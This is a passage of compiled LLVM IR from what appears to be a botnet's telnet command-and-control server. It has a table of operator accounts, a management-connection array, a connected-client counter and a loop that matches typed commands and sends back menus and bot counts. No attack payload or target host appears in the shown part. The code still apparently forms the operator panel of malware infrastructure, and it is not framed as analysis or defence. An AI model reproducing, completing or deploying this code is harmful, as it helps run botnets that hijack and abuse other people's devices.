  %295 = call i32 (i8*, i8*, ...) @sprintf(i8* %294, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.27, i32 0, i32 0)) #7
  %296 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %297 = call i32 (i8*, i8*, ...) @sprintf(i8* %296, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.28, i32 0, i32 0)) #7
  %298 = load i32, i32* %4, align 4
  %299 = call i64 @send(i32 %298, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i64 14, i32 16384)
  %300 = icmp eq i64 %299, -1
  br i1 %300, label %301, label %302

; <label>:301:                                    ; preds = %291
  br label %2115

; <label>:302:                                    ; preds = %291
  %303 = load i32, i32* %4, align 4
  %304 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %305 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %306 = call i64 @strlen(i8* %305) #8
  %307 = call i64 @send(i32 %303, i8* %304, i64 %306, i32 16384)
  %308 = icmp eq i64 %307, -1
  br i1 %308, label %309, label %310

; <label>:309:                                    ; preds = %302
  br label %2115

; <label>:310:                                    ; preds = %302
  %311 = load i32, i32* %4, align 4
  %312 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %313 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %314 = call i64 @strlen(i8* %313) #8
  %315 = call i64 @send(i32 %311, i8* %312, i64 %314, i32 16384)
  %316 = icmp eq i64 %315, -1
  br i1 %316, label %317, label %318

; <label>:317:                                    ; preds = %310
  br label %2115

; <label>:318:                                    ; preds = %310
  %319 = load i32, i32* %4, align 4
  %320 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %321 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %322 = call i64 @strlen(i8* %321) #8
  %323 = call i64 @send(i32 %319, i8* %320, i64 %322, i32 16384)
  %324 = icmp eq i64 %323, -1
  br i1 %324, label %325, label %326

; <label>:325:                                    ; preds = %318
  br label %2115

; <label>:326:                                    ; preds = %318
  br label %327

; <label>:327:                                    ; preds = %326
  %328 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %329 = load i32, i32* %5, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %330
  %332 = getelementptr inbounds %struct.account, %struct.account* %331, i32 0, i32 0
  %333 = getelementptr inbounds [20 x i8], [20 x i8]* %332, i32 0, i32 0
  %334 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %335 = call i32 (i8*, i8*, ...) @sprintf(i8* %328, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %333, i8* %334) #7
  %336 = load i32, i32* %4, align 4
  %337 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %338 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %339 = call i64 @strlen(i8* %338) #8
  %340 = call i64 @send(i32 %336, i8* %337, i64 %339, i32 16384)
  %341 = icmp eq i64 %340, -1
  br i1 %341, label %342, label %343

; <label>:342:                                    ; preds = %327
  br label %2115

; <label>:343:                                    ; preds = %327
  br label %344

; <label>:344:                                    ; preds = %343
  %345 = load i8*, i8** %3, align 8
  %346 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %345) #7
  %347 = load i32, i32* %4, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %348
  %350 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %349, i32 0, i32 1
  store i32 1, i32* %350, align 4
  br label %351

; <label>:351:                                    ; preds = %2091, %2090, %1391, %1268, %1003, %910, %753, %634, %527, %344
  %352 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %353 = load i32, i32* %4, align 4
  %354 = call i32 @fdgets(i8* %352, i32 2048, i32 %353)
  %355 = icmp sgt i32 %354, 0
  br i1 %355, label %356, label %2114

; <label>:356:                                    ; preds = %351
  %357 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %358 = call i8* @strstr(i8* %357, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #8
  %359 = icmp ne i8* %358, null
  br i1 %359, label %372, label %360

; <label>:360:                                    ; preds = %356
  %361 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %362 = call i8* @strstr(i8* %361, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0)) #8
  %363 = icmp ne i8* %362, null
  br i1 %363, label %372, label %364

; <label>:364:                                    ; preds = %360
  %365 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %366 = call i8* @strstr(i8* %365, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #8
  %367 = icmp ne i8* %366, null
  br i1 %367, label %372, label %368

; <label>:368:                                    ; preds = %364
  %369 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %370 = call i8* @strstr(i8* %369, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i32 0, i32 0)) #8
  %371 = icmp ne i8* %370, null
  br i1 %371, label %372, label %385

; <label>:372:                                    ; preds = %368, %364, %360, %356
  %373 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %374 = call i32 @clientsConnected()
  %375 = load volatile i32, i32* @managesConnected, align 4
  %376 = call i32 (i8*, i8*, ...) @sprintf(i8* %373, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.34, i32 0, i32 0), i32 %374, i32 %375) #7
  %377 = load i32, i32* %4, align 4
  %378 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %379 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %380 = call i64 @strlen(i8* %379) #8
  %381 = call i64 @send(i32 %377, i8* %378, i64 %380, i32 16384)
  %382 = icmp eq i64 %381, -1
  br i1 %382, label %383, label %384

; <label>:383:                                    ; preds = %372
  br label %384

; <label>:384:                                    ; preds = %383, %372
  br label %385

; <label>:385:                                    ; preds = %384, %368
  %386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %387 = call i8* @strstr(i8* %386, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0)) #8
  %388 = icmp ne i8* %387, null
  br i1 %388, label %397, label %389

; <label>:389:                                    ; preds = %385
  %390 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %391 = call i8* @strstr(i8* %390, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #8
  %392 = icmp ne i8* %391, null
  br i1 %392, label %397, label %393

; <label>:393:                                    ; preds = %389
  %394 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %395 = call i8* @strstr(i8* %394, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0)) #8
  %396 = icmp ne i8* %395, null
  br i1 %396, label %397, label %528

; <label>:397:                                    ; preds = %393, %389, %385
  %398 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %399 = call i32 (i8*, i8*, ...) @sprintf(i8* %398, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0)) #7
  %400 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %401 = call i32 (i8*, i8*, ...) @sprintf(i8* %400, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %402 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %403 = call i32 (i8*, i8*, ...) @sprintf(i8* %402, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.40, i32 0, i32 0)) #7
  %404 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %405 = call i32 (i8*, i8*, ...) @sprintf(i8* %404, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.41, i32 0, i32 0)) #7
  %406 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %407 = call i32 (i8*, i8*, ...) @sprintf(i8* %406, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.42, i32 0, i32 0)) #7
  %408 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %409 = call i32 (i8*, i8*, ...) @sprintf(i8* %408, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.43, i32 0, i32 0)) #7
  %410 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %411 = call i32 (i8*, i8*, ...) @sprintf(i8* %410, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.44, i32 0, i32 0)) #7
  %412 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %413 = call i32 (i8*, i8*, ...) @sprintf(i8* %412, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.45, i32 0, i32 0)) #7
  %414 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %415 = call i32 (i8*, i8*, ...) @sprintf(i8* %414, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.46, i32 0, i32 0)) #7
  %416 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %417 = call i32 (i8*, i8*, ...) @sprintf(i8* %416, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.47, i32 0, i32 0)) #7
  %418 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %419 = call i32 (i8*, i8*, ...) @sprintf(i8* %418, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %420 = load i32, i32* %4, align 4
  %421 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %422 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %423 = call i64 @strlen(i8* %422) #8
  %424 = call i64 @send(i32 %420, i8* %421, i64 %423, i32 16384)
  %425 = icmp eq i64 %424, -1
  br i1 %425, label %426, label %427

; <label>:426:                                    ; preds = %397
  br label %2115

; <label>:427:                                    ; preds = %397
  %428 = load i32, i32* %4, align 4
  %429 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %430 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %431 = call i64 @strlen(i8* %430) #8
  %432 = call i64 @send(i32 %428, i8* %429, i64 %431, i32 16384)
  %433 = icmp eq i64 %432, -1
  br i1 %433, label %434, label %435

; <label>:434:                                    ; preds = %427
  br label %2115

; <label>:435:                                    ; preds = %427
  %436 = load i32, i32* %4, align 4
  %437 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %438 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %439 = call i64 @strlen(i8* %438) #8
  %440 = call i64 @send(i32 %436, i8* %437, i64 %439, i32 16384)
  %441 = icmp eq i64 %440, -1
  br i1 %441, label %442, label %443

; <label>:442:                                    ; preds = %435
  br label %2115

; <label>:443:                                    ; preds = %435
  %444 = load i32, i32* %4, align 4
  %445 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %446 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %447 = call i64 @strlen(i8* %446) #8
  %448 = call i64 @send(i32 %444, i8* %445, i64 %447, i32 16384)
  %449 = icmp eq i64 %448, -1
  br i1 %449, label %450, label %451

; <label>:450:                                    ; preds = %443
  br label %2115

; <label>:451:                                    ; preds = %443
  %452 = load i32, i32* %4, align 4
  %453 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %454 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %455 = call i64 @strlen(i8* %454) #8
  %456 = call i64 @send(i32 %452, i8* %453, i64 %455, i32 16384)
  %457 = icmp eq i64 %456, -1
  br i1 %457, label %458, label %459

; <label>:458:                                    ; preds = %451
  br label %2115

; <label>:459:                                    ; preds = %451
  %460 = load i32, i32* %4, align 4
  %461 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %462 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %463 = call i64 @strlen(i8* %462) #8
  %464 = call i64 @send(i32 %460, i8* %461, i64 %463, i32 16384)
  %465 = icmp eq i64 %464, -1
  br i1 %465, label %466, label %467

; <label>:466:                                    ; preds = %459
  br label %2115

; <label>:467:                                    ; preds = %459
  %468 = load i32, i32* %4, align 4
  %469 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %470 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %471 = call i64 @strlen(i8* %470) #8
  %472 = call i64 @send(i32 %468, i8* %469, i64 %471, i32 16384)
  %473 = icmp eq i64 %472, -1
  br i1 %473, label %474, label %475

; <label>:474:                                    ; preds = %467
  br label %2115

; <label>:475:                                    ; preds = %467
  %476 = load i32, i32* %4, align 4
  %477 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %478 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %479 = call i64 @strlen(i8* %478) #8
  %480 = call i64 @send(i32 %476, i8* %477, i64 %479, i32 16384)
  %481 = icmp eq i64 %480, -1
  br i1 %481, label %482, label %483

; <label>:482:                                    ; preds = %475
  br label %2115

; <label>:483:                                    ; preds = %475
  %484 = load i32, i32* %4, align 4
  %485 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %486 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %487 = call i64 @strlen(i8* %486) #8
  %488 = call i64 @send(i32 %484, i8* %485, i64 %487, i32 16384)
  %489 = icmp eq i64 %488, -1
  br i1 %489, label %490, label %491

; <label>:490:                                    ; preds = %483
  br label %2115

; <label>:491:                                    ; preds = %483
  %492 = load i32, i32* %4, align 4
  %493 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %494 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %495 = call i64 @strlen(i8* %494) #8
  %496 = call i64 @send(i32 %492, i8* %493, i64 %495, i32 16384)
  %497 = icmp eq i64 %496, -1
  br i1 %497, label %498, label %499

; <label>:498:                                    ; preds = %491
  br label %2115

; <label>:499:                                    ; preds = %491
  %500 = load i32, i32* %4, align 4
  %501 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %502 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %503 = call i64 @strlen(i8* %502) #8
  %504 = call i64 @send(i32 %500, i8* %501, i64 %503, i32 16384)
  %505 = icmp eq i64 %504, -1
  br i1 %505, label %506, label %507

; <label>:506:                                    ; preds = %499
  br label %2115

; <label>:507:                                    ; preds = %499
  %508 = load i8*, i8** %3, align 8
  %509 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %508) #7
  br label %510

; <label>:510:                                    ; preds = %507
  %511 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %512 = load i32, i32* %5, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %513
  %515 = getelementptr inbounds %struct.account, %struct.account* %514, i32 0, i32 0
  %516 = getelementptr inbounds [20 x i8], [20 x i8]* %515, i32 0, i32 0
  %517 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %518 = call i32 (i8*, i8*, ...) @sprintf(i8* %511, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %516, i8* %517) #7
  %519 = load i32, i32* %4, align 4
  %520 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %521 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %522 = call i64 @strlen(i8* %521) #8
  %523 = call i64 @send(i32 %519, i8* %520, i64 %522, i32 16384)
  %524 = icmp eq i64 %523, -1
  br i1 %524, label %525, label %526

; <label>:525:                                    ; preds = %510
  br label %2115

; <label>:526:                                    ; preds = %510
  br label %527

; <label>:527:                                    ; preds = %526
  br label %351

; <label>:528:                                    ; preds = %393
  %529 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %530 = call i8* @strstr(i8* %529, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.48, i32 0, i32 0)) #8
  %531 = icmp ne i8* %530, null
  br i1 %531, label %544, label %532

; <label>:532:                                    ; preds = %528
  %533 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %534 = call i8* @strstr(i8* %533, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i32 0, i32 0)) #8
  %535 = icmp ne i8* %534, null
  br i1 %535, label %544, label %536

; <label>:536:                                    ; preds = %532
  %537 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %538 = call i8* @strstr(i8* %537, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0)) #8
  %539 = icmp ne i8* %538, null
  br i1 %539, label %544, label %540

; <label>:540:                                    ; preds = %536
  %541 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %542 = call i8* @strstr(i8* %541, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)) #8
  %543 = icmp ne i8* %542, null
  br i1 %543, label %544, label %635

; <label>:544:                                    ; preds = %540, %536, %532, %528
  %545 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %546 = call i32 (i8*, i8*, ...) @sprintf(i8* %545, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.52, i32 0, i32 0)) #7
  %547 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %548 = call i32 (i8*, i8*, ...) @sprintf(i8* %547, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %549 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %550 = call i32 (i8*, i8*, ...) @sprintf(i8* %549, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.53, i32 0, i32 0)) #7
  %551 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %552 = call i32 (i8*, i8*, ...) @sprintf(i8* %551, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.54, i32 0, i32 0)) #7
  %553 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %554 = call i32 (i8*, i8*, ...) @sprintf(i8* %553, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.55, i32 0, i32 0)) #7
  %555 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %556 = call i32 (i8*, i8*, ...) @sprintf(i8* %555, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.56, i32 0, i32 0)) #7
  %557 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %558 = call i32 (i8*, i8*, ...) @sprintf(i8* %557, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %559 = load i32, i32* %4, align 4
  %560 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %561 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %562 = call i64 @strlen(i8* %561) #8
  %563 = call i64 @send(i32 %559, i8* %560, i64 %562, i32 16384)
  %564 = icmp eq i64 %563, -1
  br i1 %564, label %565, label %566

; <label>:565:                                    ; preds = %544
  br label %2115

; <label>:566:                                    ; preds = %544
  %567 = load i32, i32* %4, align 4
  %568 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %569 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %570 = call i64 @strlen(i8* %569) #8
  %571 = call i64 @send(i32 %567, i8* %568, i64 %570, i32 16384)
  %572 = icmp eq i64 %571, -1
  br i1 %572, label %573, label %574

; <label>:573:                                    ; preds = %566
  br label %2115

; <label>:574:                                    ; preds = %566
  %575 = load i32, i32* %4, align 4
  %576 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %577 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %578 = call i64 @strlen(i8* %577) #8
  %579 = call i64 @send(i32 %575, i8* %576, i64 %578, i32 16384)
  %580 = icmp eq i64 %579, -1
  br i1 %580, label %581, label %582

; <label>:581:                                    ; preds = %574
  br label %2115

; <label>:582:                                    ; preds = %574
  %583 = load i32, i32* %4, align 4
  %584 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %585 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %586 = call i64 @strlen(i8* %585) #8
  %587 = call i64 @send(i32 %583, i8* %584, i64 %586, i32 16384)
  %588 = icmp eq i64 %587, -1
  br i1 %588, label %589, label %590

; <label>:589:                                    ; preds = %582
  br label %2115

; <label>:590:                                    ; preds = %582
  %591 = load i32, i32* %4, align 4
  %592 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %593 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %594 = call i64 @strlen(i8* %593) #8
  %595 = call i64 @send(i32 %591, i8* %592, i64 %594, i32 16384)
  %596 = icmp eq i64 %595, -1
  br i1 %596, label %597, label %598

; <label>:597:                                    ; preds = %590
  br label %2115

; <label>:598:                                    ; preds = %590
  %599 = load i32, i32* %4, align 4
  %600 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %601 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %602 = call i64 @strlen(i8* %601) #8
  %603 = call i64 @send(i32 %599, i8* %600, i64 %602, i32 16384)
  %604 = icmp eq i64 %603, -1
  br i1 %604, label %605, label %606

; <label>:605:                                    ; preds = %598
  br label %2115

; <label>:606:                                    ; preds = %598
  %607 = load i32, i32* %4, align 4
  %608 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %609 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %610 = call i64 @strlen(i8* %609) #8
  %611 = call i64 @send(i32 %607, i8* %608, i64 %610, i32 16384)
  %612 = icmp eq i64 %611, -1
  br i1 %612, label %613, label %614

; <label>:613:                                    ; preds = %606
  br label %2115

; <label>:614:                                    ; preds = %606
  %615 = load i8*, i8** %3, align 8
  %616 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %615) #7
  br label %617

; <label>:617:                                    ; preds = %614
  %618 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %619 = load i32, i32* %5, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %620
  %622 = getelementptr inbounds %struct.account, %struct.account* %621, i32 0, i32 0
  %623 = getelementptr inbounds [20 x i8], [20 x i8]* %622, i32 0, i32 0
  %624 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %625 = call i32 (i8*, i8*, ...) @sprintf(i8* %618, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %623, i8* %624) #7
  %626 = load i32, i32* %4, align 4
  %627 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %628 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %629 = call i64 @strlen(i8* %628) #8
  %630 = call i64 @send(i32 %626, i8* %627, i64 %629, i32 16384)
  %631 = icmp eq i64 %630, -1
  br i1 %631, label %632, label %633

; <label>:632:                                    ; preds = %617
  br label %2115

; <label>:633:                                    ; preds = %617
  br label %634

; <label>:634:                                    ; preds = %633
  br label %351

; <label>:635:                                    ; preds = %540
  %636 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %637 = call i8* @strstr(i8* %636, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i32 0, i32 0)) #8
  %638 = icmp ne i8* %637, null
  br i1 %638, label %651, label %639

; <label>:639:                                    ; preds = %635
  %640 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %641 = call i8* @strstr(i8* %640, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0)) #8
  %642 = icmp ne i8* %641, null
  br i1 %642, label %651, label %643

; <label>:643:                                    ; preds = %639
  %644 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %645 = call i8* @strstr(i8* %644, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0)) #8
  %646 = icmp ne i8* %645, null
  br i1 %646, label %651, label %647

; <label>:647:                                    ; preds = %643
  %648 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %649 = call i8* @strstr(i8* %648, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i32 0, i32 0)) #8
  %650 = icmp ne i8* %649, null
  br i1 %650, label %651, label %754

; <label>:651:                                    ; preds = %647, %643, %639, %635
  %652 = load i8*, i8** %3, align 8
  %653 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %652) #7
  %654 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %655 = call i32 (i8*, i8*, ...) @sprintf(i8* %654, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.61, i32 0, i32 0)) #7
  %656 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %657 = call i32 (i8*, i8*, ...) @sprintf(i8* %656, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %658 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %659 = call i32 (i8*, i8*, ...) @sprintf(i8* %658, i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str.62, i32 0, i32 0)) #7
  %660 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %661 = call i32 (i8*, i8*, ...) @sprintf(i8* %660, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.63, i32 0, i32 0)) #7
  %662 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %663 = call i32 (i8*, i8*, ...) @sprintf(i8* %662, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i32 0, i32 0)) #7
  %664 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %665 = call i32 (i8*, i8*, ...) @sprintf(i8* %664, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.65, i32 0, i32 0)) #7
  %666 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %667 = call i32 (i8*, i8*, ...) @sprintf(i8* %666, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.66, i32 0, i32 0)) #7
  %668 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %669 = call i32 (i8*, i8*, ...) @sprintf(i8* %668, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %670 = load i32, i32* %4, align 4
  %671 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %672 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %673 = call i64 @strlen(i8* %672) #8
  %674 = call i64 @send(i32 %670, i8* %671, i64 %673, i32 16384)
  %675 = icmp eq i64 %674, -1
  br i1 %675, label %676, label %677

; <label>:676:                                    ; preds = %651
  br label %2115

; <label>:677:                                    ; preds = %651
  %678 = load i32, i32* %4, align 4
  %679 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %680 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %681 = call i64 @strlen(i8* %680) #8
  %682 = call i64 @send(i32 %678, i8* %679, i64 %681, i32 16384)
  %683 = icmp eq i64 %682, -1
  br i1 %683, label %684, label %685

; <label>:684:                                    ; preds = %677
  br label %2115

; <label>:685:                                    ; preds = %677
  %686 = load i32, i32* %4, align 4
  %687 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %688 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
